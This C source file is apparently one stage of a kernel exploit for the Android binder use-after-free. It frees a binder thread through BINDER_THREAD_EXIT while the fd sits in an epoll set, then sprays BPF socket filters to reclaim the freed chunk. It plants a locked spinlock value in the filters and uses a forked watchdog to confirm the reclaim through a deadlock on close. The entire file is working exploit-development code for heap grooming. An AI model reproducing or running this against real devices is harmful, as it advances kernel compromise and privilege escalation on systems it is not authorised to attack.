/*
 * hangtest: if the freed binder chunk C is reclaimed by our filter payload,
 * close(epfd) -> remove_wait_queue -> spin_lock(C+0x98) will DEADLOCK on a
 * locked ticket-spinlock value (owner!=next) planted at insn19.
 * fork+watchdog: child does the close; parent reports HANG or CLEAN.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/wait.h>

#define BINDER_THREAD_EXIT 0x40046208
#define BINDER_VERSION     0xc0046209
#ifndef SO_ATTACH_FILTER
#define SO_ATTACH_FILTER 1
#endif
#ifndef __NR_sched_setaffinity
#define __NR_sched_setaffinity 122
#endif

struct sf { unsigned short code; unsigned char jt, jf; unsigned int k; };
struct sfp { unsigned short len; struct sf *f; };

#define NINSNS 62
#define LOCK_INSN 19
#define NSOCK 100

static struct sf insns[NINSNS];
static struct sfp prog;

static void pin_cpu0(void)
{
    unsigned long long mask = 1;
    syscall(__NR_sched_setaffinity, 0, sizeof(mask), &mask);
}

/* child work: returns after everything; hangs if the lock value is locked */
static void child_work(int locked_lock)
{
    int fd, epfd, socks[NSOCK];
    int ver = 0, nsock = 0;
    struct epoll_event ev;

    for (int i = 0; i < NSOCK; i++) {
        socks[nsock] = socket(AF_UNIX, SOCK_DGRAM, 0);
        if (socks[nsock] < 0) break;
        nsock++;
    }
    epfd = epoll_create1(0);
    fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (fd < 0) _exit(3);
    if (ioctl(fd, BINDER_VERSION, &ver) < 0) _exit(4);

    ev.events = EPOLLIN; ev.data.fd = fd;
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev) < 0) _exit(5);

    if (ioctl(fd, BINDER_THREAD_EXIT, 0) < 0) _exit(6);

    for (int i = 0; i < nsock; i++)
        if (setsockopt(socks[i], SOL_SOCKET, SO_ATTACH_FILTER,
                       &prog, sizeof(prog)) < 0) _exit(7);

    close(epfd);            /* <- hangs here if C is a filter chunk */
    _exit(0);
}

int main(int argc, char **argv)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    pin_cpu0();

    int iters = 5;
    for (int it = 0; it < iters; it++) {
        /* locked lock: owner=1, next=0 -> spin forever
           bytes 01 00 00 00 -> code=0x0001 (LD W IMM), jt=0, jf=0, k=1 */
        for (int i = 0; i < NINSNS; i++) {
            insns[i].code = 0x0006; insns[i].jt = 0; insns[i].jf = 0;
            insns[i].k = 0x22000000;
        }
        insns[LOCK_INSN].code = 0x0001; insns[LOCK_INSN].jt = 0;
        insns[LOCK_INSN].jf = 0; insns[LOCK_INSN].k = 1;
        prog.len = NINSNS; prog.f = insns;

        pid_t p = fork();
        if (p == 0) child_work(1);
        int st = 0;
        for (int t = 0; t < 30; t++) {
            usleep(100000);
            pid_t r = waitpid(p, &st, WNOHANG);
            if (r == p) { printf("iter%d: CLEAN (child exited st=%d)\n", it, st); break; }
            if (t == 29) {
                printf("iter%d: *** HANG *** -> C IS a filter chunk, writeback reached it\n", it);
                kill(p, 9);
                waitpid(p, &st, 0);
            }
        }
    }
    return 0;
}
